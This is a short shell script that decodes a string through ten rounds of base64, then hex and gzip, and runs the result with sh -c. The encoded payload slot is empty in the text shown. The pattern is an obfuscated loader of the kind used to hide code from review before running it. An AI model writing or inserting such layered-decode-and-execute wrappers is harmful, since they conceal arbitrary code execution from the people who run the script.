clear
export LC_ALL=C

xuwunb() {
    local content="$1"
    for i in $(seq 1 10); do  # 改为10层解码
        content=$(printf "%s" "$content" | base64 -d)
    done
    echo "$content"
}

hex_content=$(xuwunb "")
decrypted_content=$(echo "$hex_content" | xxd -p -r | gunzip)
sh -c "$decrypted_content" "$0" "$@"
